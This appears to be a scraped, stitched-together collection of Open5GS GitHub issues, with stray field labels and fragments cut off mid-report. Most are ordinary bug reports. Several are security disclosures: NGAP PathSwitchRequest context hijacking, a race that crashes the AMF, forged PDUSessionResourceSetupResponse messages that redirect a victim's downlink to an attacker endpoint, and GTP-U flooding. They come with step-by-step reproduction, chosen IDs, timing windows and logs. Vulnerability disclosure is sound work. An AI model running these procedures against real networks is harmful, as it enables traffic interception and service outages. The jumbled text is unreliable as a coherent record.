   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell

[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

UERANSIM

UERANSIM

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7 (tested)

### Steps to reproduce

1) Establish legitimate user-plane traffic through the UPF (e.g., ICMP ping or a steady UDP flow between two UEs / UE↔DN) and record **baseline RTT/loss** for several minutes.

2) From another host with L3 reachability to the UPF GTP-U endpoint, send a sustained stream to:

`udp://UPF_GTP_U_IP:2152`

The stream should **interleave** at high rate:
- **GTP-U Echo Requests** (to force Echo Responses on the hot path), and
- **G-PDUs** referencing **invalid/unknown TEIDs** (to force TEID lookup miss handling and related error-path work).

3) While the abusive stream continues, **re-measure** the legitimate flow RTT/loss and capture UPF symptoms:
```bash
docker logs --since <START_TIME> upf | tail -n 200
docker stats --no-stream <upf_container>
```

### Observed example (lab)
- Baseline RTT: ~1–3 ms  
- Under attack: RTT p95 > 100 ms, spikes > 300 ms  
- Packet loss: increases from ~0% to >5–10%  
Legitimate PDU sessions may remain “up”, but the user plane becomes **unusable for timely control/data**.

From the code path that matches the observed behavior:

**Main receive path (GTP-U datapath hot callback)**
- `src/upf/gtp-path.c`
- `_gtpv1_u_recv_cb(...)`

**Key regions implicated by runtime behavior (high-signal)**
- **GTP-U Echo Request handling**: logs and sends **Echo Response** (work executed per packet on the datapath).
- **Invalid/unknown TEID handling for G-PDU**:
  - TEID lookup miss path
  - may emit **GTP-U Error Indication** / related responses (additional synchronous work)
- **Error paths with synchronous diagnostics**:
  - `ogs_error(...)` plus `ogs_log_hexdump(...)` style logging on the hot path

Because these branches execute inside the **user-plane receive callback**, they can **starve** the forwarding loop under sustained abusive input, inflating latency and loss for unrelated legitimate traffic (resource exhaustion / expensive synchronous work on the datapath; CWE-400 class behavior).

I can provide a controlled traffic generator, measurement scripts, and logs/pcaps privately 

### Logs

```shell
N/A
```

### Expected behaviour

UPF should remain stable under abusive input and should bound/limit expensive diagnostics and response generation on the hot path (rate limiting / cheap drops).


### Observed Behaviour

Legitimate user-plane traffic experiences severe performance degradation (latency inflation / loss) under sustained abusive GTP-U traffic, even while sessions may remain established.

### eNodeB/gNodeB

UERANSIM gNodeB v3.2.7

### UE Models and versions

UERANSIM UE v3.2.7

items.title: AMF fails to handle inconsistent RAN UE NGAP ID per TS 38.413 §10.6

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
**Description**

The AMF incorrectly continues a UE-associated signalling connection after receiving an inconsistent RAN UE NGAP ID, violating 3GPP TS 38.413 clause 10.6.

**Steps to reproduce**

1. gNB sends `INITIAL UE MESSAGE` (REGISTRATION REQUEST) with `RAN UE NGAP ID = 255`.
2. AMF responds with `DOWNLINK NAS TRANSPORT` (IDENTITY REQUEST) using `RAN UE NGAP ID = 255` – the UE-associated logical NG‑connection is established.
3. gNB sends `UPLINK NAS TRANSPORT` (IDENTITY RESPONSE) but with `RAN UE NGAP ID = 1` (inconsistent).
4. AMF sends another `DOWNLINK NAS TRANSPORT` (AUTHENTICATION REQUEST) still using `RAN UE NGAP ID = 255`.

**Expected behaviour**

According to TS 38.413 §10.6, upon receiving a message (other than first/first‑returned/last) with an inconsistent remote AP ID, the AMF **shall**:
- initiate the `Error Indication` procedure with the received AP IDs and an appropriate cause value,
- locally release the UE‑associated logical connection.

No further signalling on that connection should take place.

**Actual behaviour**

The AMF ignores the inconsistency and continues the NAS procedure using the original `RAN UE NGAP ID`.

**Impact**

- Protocol robustness issue; potential state mismatch between gNB and AMF.
- Could lead to resource leaks or improper handling if the gNB’s ID change was intentional (e.g., following an internal reset).

items.title: [Bug]: UE Downlink Redirection via Forged PDUSessionResourceSetupResponse

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Summary

The AMF in Open5GS v2.7.6 resolves the UE context for an incoming `PDUSessionResourceSetupResponse` by looking up the `AMF-UE-NGAP-ID` in a process-wide pool, without verifying that the sending NG-RAN node owns the UE-associated logical NG-connection identified by that ID. A second gNB that has completed its own NG Setup with the AMF can submit a `PDUSessionResourceSetupResponse` carrying another UE's `AMF-UE-NGAP-ID` together with an attacker-controlled GTP-U tunnel endpoint. The AMF accepts the response and relays the supplied transfer to the SMF, which in turn reprograms the UPF — causing the victim UE's downlink user-plane traffic to be forwarded to the attacker's gNB.

### Details

**Affected Files:**
- `src/amf/context.c:1475` — `ran_ue_find_by_amf_ue_ngap_id()`
- `src/amf/ngap-handler.c:1959` — `ngap_handle_pdu_session_resource_setup_response()` invocation

**Root Cause:**

The lookup primitive used to resolve a UE on `PDUSessionResourceSetupResponse` ignores which gNB the message arrived on. `ran_ue_find_by_amf_ue_ngap_id()` is a thin wrapper over a process-wide pool lookup keyed solely by the AMF-side ID:

```c
// src/amf/context.c:1475
ran_ue_t *ran_ue_find_by_amf_ue_ngap_id(uint64_t amf_ue_ngap_id)
{
    return ran_ue_find(amf_ue_ngap_id);   // ogs_pool_find on ran_ue_pool — no gnb scoping
}
```

For comparison, the sibling lookup `ran_ue_find_by_ran_ue_ngap_id()` (context.c:1457) takes an `amf_gnb_t *gnb` argument and walks only that gNB's `ran_ue_list` — so the scoping primitive exists, but the AMF-UE-NGAP-ID path does not use it.

The PDU session response handler then resolves and proceeds with the response without comparing the sending gNB (`gnb`, the SCTP/TNLA the message was received on) to the gNB that owns the resolved UE context (`ran_ue->gnb`):

```c
// src/amf/ngap-handler.c:1959
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]", ...);
    /* sends Error Indication, returns */
}

/* No check of the form: if (ran_ue->gnb != gnb) { reject; } */

amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
...
/* PDUSessionResourceSetupResponseTransfer is forwarded to the SMF */
```

A second gNB that has completed its own NG Setup with the AMF can therefore submit a `PDUSessionResourceSetupResponse` whose `AMF-UE-NGAP-ID` belongs to a UE attached via a different gNB; the AMF resolves that UE's context and relays the attacker-supplied transfer (containing the GTP-U tunnel endpoint that the UPF should use for downlink delivery) to the SMF as if the response had come from the legitimate serving gNB.

**Propagation / User-Plane Impact:**

The `PDUSessionResourceSetupResponseTransfer` carries the N3 tunnel endpoint (GTP-U IP and TEID) the UPF should forward downlink user traffic to. Once the AMF accepts the forged response, it forwards the transfer to the SMF via `Nsmf_PDUSession_UpdateSMContext` (`POST /nsmf-pdusession/v1/sm-contexts/{ref}/modify`). The SMF in turn issues a PFCP `Session Modification Request` to the UPF, which installs/updates the corresponding Forwarding Action Rule. From that moment, the victim UE's downlink user-plane traffic is delivered to the attacker's gNB.

### PoC

**Environment:**
- Open5GS v2.7.6
- AMF NGAP listener: `10.3.0.4:38412`
- UERANSIM v3.2.7 , two independent gNBs against the same AMF:
  - gNB-A: `10.3.0.3` (NCI=0x10, RAN_ID=1)
  - gNB-B: `10.3.0.33` (NCI=0x20, RAN_ID=2) — attacker, no UE of its own

**Reproduction Steps:**

1. Bring up the Open5GS stack and register a victim UE through gNB-A (NG Setup → Registration → Authentication → Security Mode → PDU Session Setup). The UE obtains a PDU session and is reachable for downlink traffic. 

2. Start gNB-B against the same AMF and let it complete its own NG Setup. gNB-B has no attached UE.

3. From gNB-B, send **a single** `PDUSessionResourceSetupResponse` carrying:
   - `AMF-UE-NGAP-ID` = the victim's value
   - `RAN-UE-NGAP-ID` = the victim's value 
   - `PDUSessionResourceSetupResponseTransfer` containing a GTP-U endpoint controlled by the attacker (test value: IP `6.6.6.6`, TEID `0xDEAD`).

4. Observe the AMF debug log and the SMF response.

**Observed Result:**

Victim UE registers via gNB-A (`10.3.0.3`) and is allocated `AMF_UE_NGAP_ID=1`, `RAN_UE_NGAP_ID=1`:

```
04/27 14:06:02.196: [amf] INFO:     RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[1] TAC[1] CellID[0x10]   ← victim UE on gNB-A
04/27 14:06:02.... : [amf] INFO: [imsi-001019756139935:1:11] /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify  ← legitimate PDU session established (DNN: internet)
```

gNB-B then completes its own NG Setup and fires a single forged response:

```
04/27 14:06:24.575: [amf] INFO: gNB-N2 accepted[10.3.0.33]:44857 in ng-path module          ← gNB-B SCTP up
04/27 14:06:24.581: [amf] DEBUG:     IP[10.3.0.33] RAN_ID[2]                                ← gNB-B NG Setup completes
04/27 14:06:28.657: [amf] DEBUG: PDUSessionResourceSetupResponse                            ← single forged message from gNB-B
04/27 14:06:28.657: [amf] DEBUG:     IP[10.3.0.33] RAN_ID[2]                                  (sending TNLA = gNB-B, NOT the victim's serving gNB)
04/27 14:06:28.657: [amf] DEBUG:     SUPI[imsi-001019756139935] PSI[1] OLD ACTIVATED[0x2]    (resolved to victim UE on gNB-A)
04/27 14:06:28.657: [sbi] DEBUG: [POST] http://127.0.0.4:7777/nsmf-pdusession/v1/sm-contexts/1/modify
04/27 14:06:28.658: [sbi] DEBUG: [204:POST] http://127.0.0.4:7777/nsmf-pdusession/v1/sm-contexts/1/modify
04/27 14:06:28.659: [amf] INFO: [imsi-001019756139935:1:11] /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify
                                                                                            ← attacker-supplied transfer accepted for the victim UE
```

The AMF accepted the response from gNB-B (`10.3.0.33`, `RAN_ID=2`) — a different gNB from the UE's serving gNB-A — and forwarded the attacker-supplied transfer to the SMF as `Nsmf_PDUSession_UpdateSMContext`. The SMF returned `204 No Content` — the success path — meaning the modification (with the attacker-supplied N3 endpoint) was accepted and propagated downstream toward the UPF for FAR update. The victim's IMSI (`imsi-001019756139935`) appears in the AMF's audit line for the modify call, confirming that the attacker's payload was applied to the victim's PDU session, not gNB-B's own (gNB-B has none).

No Error Indication was emitted toward gNB-B for this response, and the UE-associated logical NG-connection on gNB-A was not released.

pcap:
[UE Downlink Redirection via Forged PDUSessionResourceSetupResponse.zip](https://github.com/user-attachments/files/27116371/UE.Downlink.Redirection.via.Forged.PDUSessionResourceSetupResponse.zip)

### Expected Behaviour

When the AMF resolves a UE-associated NGAP message by `AMF-UE-NGAP-ID`, it should additionally verify that the message arrived on the SCTP/TNLA association bound to the resolved UE's serving gNB. Concretely, after the lookup, the AMF should compare the sending NG-RAN node (the `gnb` the message was received from) against `ran_ue->gnb`. If they differ, the message must be rejected:

- the AMF must not propagate the message contents (e.g. a `PDUSessionResourceSetupResponseTransfer`) to the SMF or any other downstream NF, and
- the AMF should respond with an Error Indication on the offending TNLA.

This is a basic authorization invariant: only the gNB that owns the UE-associated logical NG-connection may submit responses on behalf of that UE.

### Observed Behaviour

`ran_ue_find_by_amf_ue_ngap_id()` (`src/amf/context.c:1475`) is a process-wide pool lookup that does not take the sending gNB as an argument, and the PDU session response handler (`src/amf/ngap-handler.c:1959`) does not perform any subsequent `ran_ue->gnb == gnb` check. As a result, a `PDUSessionResourceSetupResponse` arriving on the SCTP association of gNB-B but carrying an `AMF-UE-NGAP-ID` that belongs to a UE attached via gNB-A is treated as a legitimate response from the UE's serving gNB.

In the captured run 

- Packets 1–24: victim UE registers on gNB-A (`10.3.0.3`), AMF allocates `AMF_UE_NGAP_ID=1` / `RAN_UE_NGAP_ID=1`, one PDU session (DNN `internet`) is established legitimately.
- Packets 25–30, 39–40: SCTP heartbeats (idle period — no UE-plane activity between registration and the attack).
- Packets 31–38: gNB-B (`10.3.0.33`) brings up its own SCTP association with the AMF and completes NG Setup (`RAN_ID=2`).
- Packet 41: gNB-B sends a **single** `PDUSessionResourceSetupResponse` containing the matched IDs (`AMF_UE_NGAP_ID=1`, `RAN_UE_NGAP_ID=1`) and the attacker's GTP-U endpoint (`6.6.6.6` / `0xDEAD`).
- AMF behaviour: lookup by `AMF-UE-NGAP-ID` resolves to the victim's context (whose serving gNB is gNB-A), no comparison of sending TNLA against `ran_ue->gnb` is performed, the attacker-supplied transfer is forwarded to the SMF (`POST /nsmf-pdusession/v1/sm-contexts/1/modify`), and the SMF returns `204 No Content` — programming the new N3 endpoint downstream toward the UPF. The audit line `[imsi-001019756139935:1:11]` confirms the modify was applied to the victim UE's PDU session.

The IDs in the incoming message are identical to the values the AMF has stored for the victim — so a hypothetical value-consistency check (e.g. "received `RAN-UE-NGAP-ID` must equal `ran_ue->ran_ue_ngap_id`") would have passed. No mismatch is detected between the sending gNB and the UE's serving gNB, because no such check exists.


### eNodeB/gNodeB

UERANSIM v3.2.7

UERANSIM v3.2.7

labels.name: type:enhancement

labels.name: Sponsors
labels.description: Sponsor inquiries are guaranteed to be answered.

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

1. Send a `Create-Session-Request` via GTPv2 S2b interface to the SMF with the `Node-Identifier` IE that contains host and realm of the AAA-Server
2. Have a look at the triggered Diameter S6b AAR

[PGW_does_not_redirect_15_10_2024.zip](https://github.com/user-attachments/files/17380380/PGW_does_not_redirect_15_10_2024.zip)

### Logs

```shell
See attachment for details

10/15 15:19:13.763: [smf] ERROR: Result Code: 3006 (../src/smf/s6b-path.c:395)
10/15 15:19:13.764: [smf] ERROR: Unexpected Diameter Result Code 3006/-1, defaulting to severe network failure (../src/smf/gsm-sm.c:59)
```


### Expected behaviour

Either 1 or 2 (preferably 1)

1. When the ePDG sends the host and realm to the SMF in a GTPv2 Create-Session-Request over the S2b interface, the SMF utilizes the data to craft a Diameter S6b AAR towards the AAA-Server by setting both, `Destination-Realm` and `Destination-Host` AVP.

2. If the PGW would not set the `Destination-Host` AVP, the SMF has to support result code DIAMETER_REDIRECT_INDICATION and re-send the request towards the correct AAA-Server indicated by the `Redirect-Host` AVP in the AAA.

### Observed Behaviour

When the ePDG sends the host and realm to the SMF in a GTPv2 Create-Session-Request over the S2b interface, the SMF utilizes the data to craft a Diameter S6b AAR towards the AAA-Server by setting **only** the `Destination-Realm` AVP. The AAA-Server responds with a `Result-Code` AVP containing the result code DIAMETER_REDIRECT_INDICATION. The SMF logs an error and does not send a follow-up request towards the correct AAA-Server.

### eNodeB/gNodeB

BaiCells eNodeB

### UE Models and versions

iPhone (iOS 16.5.1)

1. Register a UE that uses PDU session release before deregistration
2. Start switch off (toggle flight mode)

### Logs

Successful:

AMF to not trigger an NGAP Error Indication and trigger a NGAP "UEContextReleaseCommand" when the UE sends the NAS "Deregistration request (UE originating)"

items.title: [Bug]: PDU Session modification competing with InitialContextSetup resulting failure in QoS flow setup in 5GNR

labels.name: type:bug
labels.description: Open5GS bug

items.body:
### Open5GS Release, Revision, or Tag

v.2.6.6

### Steps to reproduce

Environment: 

- 5G SA core, all components on a single VM
- gNB: Huawei 5900 BB
- UE: Mikrotik Chateu 5g ax (single UE is attached to the network)

With a single QoS flow configuration registration is fine nothing strage happens. After adding extra 5QI flow to the same APN registration fails:
![pcap_fails](https://github.com/open5gs/open5gs/assets/10401302/cb01c124-9d34-49c7-9605-d6d5b997a410)

Our basic configration is the following:
![QoSFlowconfig](https://github.com/open5gs/open5gs/assets/10401302/9b6acd7b-8b9b-4d51-a7e4-acbb70999ae1)

The error message while the PDU session modification fails is as follows:
![radionetworkerror](https://github.com/open5gs/open5gs/assets/10401302/0a2ea92b-21fe-4bdb-be0f-c5bbccaca44a)

The gNB reports that the PDU session will not be modified (i.e. additional QoS flow will not be added) because there is an ongoing interaction with another procedure. After checking the pcap files and the logs the ongoing procedure is the "InitialContextSetup" - the PDUSessionmodification was sent out before the InitialContextSetupResponse was received (as can be seen above).
As an ugly workaround and for testing I put a 0.5 sec sleep in smf/binding.c before it is calling the function named "smf_5gc_pfcp_send_qos_flow_list_modification_request" to delay the PDUSessionModificationRequest message. Thanks to this I could avoid the competing scenario which resulted a successful PDUSessionModification:
![pcap_ok](https://github.com/open5gs/open5gs/assets/10401302/70f67dfb-7629-4985-9faf-b7480c8b2fa0)

I am not sure how to fix this, but in general we should may avoid interfere with active procedures (maybe we should wait in AMF before sending out multiple requests, or delay sm-policy discover or sm-context/modify).

items.title: SGWC crashes randomly after disconnecting a VoLTE call
items.body:
Hello @acetcom ,

I am using the code from tag v2.3.0, where SGWC crashes randomly when placing either multiple calls or when disconnecting a single VoLTE call. I am attaching a trace containing the following scenario

1. Register two UEs with IMS
2. Place a call
3. Disconnect the call
4. SGWC crashes (random)

[sgwc_crash_epc.zip](https://github.com/open5gs/open5gs/files/6817215/sgwc_crash_epc.zip)

Following is the backtrace on SGWC long with some logs
[sgwc_backtrace_log.txt](https://github.com/open5gs/open5gs/files/6817231/sgwc_backtrace_log.txt)

While debugging based on the backtrace and logs I found some issue in the following code, where variable 'sess' is being used in ogs_list_for_each, but 'sess' is a parameter passed to sgwc_sxa_handle_session_modification_response function and being overwritten in ogs_list_for_each. Please correct me if I got this wrong. There are other places in the sgwc_sxa_handle_session_modification_response function where sess is overwritten 

https://github.com/open5gs/open5gs/blob/4667b99c922a89399ccb22dc27ae4bd64d7fdcf3/src/sgwc/sxa-handler.c#L989

items.title: After successful 5G SA Registration and PDU session accept, UE keeps on doing Registration request (of type 'mobility registration updating', not initial reg) immediately
items.body:
Hi @acetcom,

Last night you were helping me on this issue (in another issue's thread), let me create a new issue for it.

**issue:** UE got IP but only last ~1 second or so, then UE does registration request (mobility registration updating, not initial reg) again and accept , and PDU session req and accept, then repeats again and again.

I have two phones, they have exact same issue. On older version of (2-3 months) opem5gs, with exact phone and gNB, I don't have this issue, so I guess it's more an issue on open5gs side.

v2.2.3 open5gs

**all NFs config yaml file:**
[all-config-sent-to-aetcom.tar.gz](https://github.com/open5gs/open5gs/files/6251209/all-config-sent-to-aetcom.tar.gz)

all NFs log file (in /var/log/open5g):
[all-log-to-acetcom.tar.gz](https://github.com/open5gs/open5gs/files/6251210/all-log-to-acetcom.tar.gz)

**pcap log:**

[41-reinstall-open5gs-log26.pcap.gz](https://github.com/open5gs/open5gs/files/6251214/41-reinstall-open5gs-log26.pcap.gz)

Observation:
I compared the 'Registration Accept' message of v2.2.3 open5gs (left side) vs the one on older version of open5gs (right side), the right one has 'allowed NSSAI' info while v2.2.3 does not have it.

Thanks a lot!

Br,
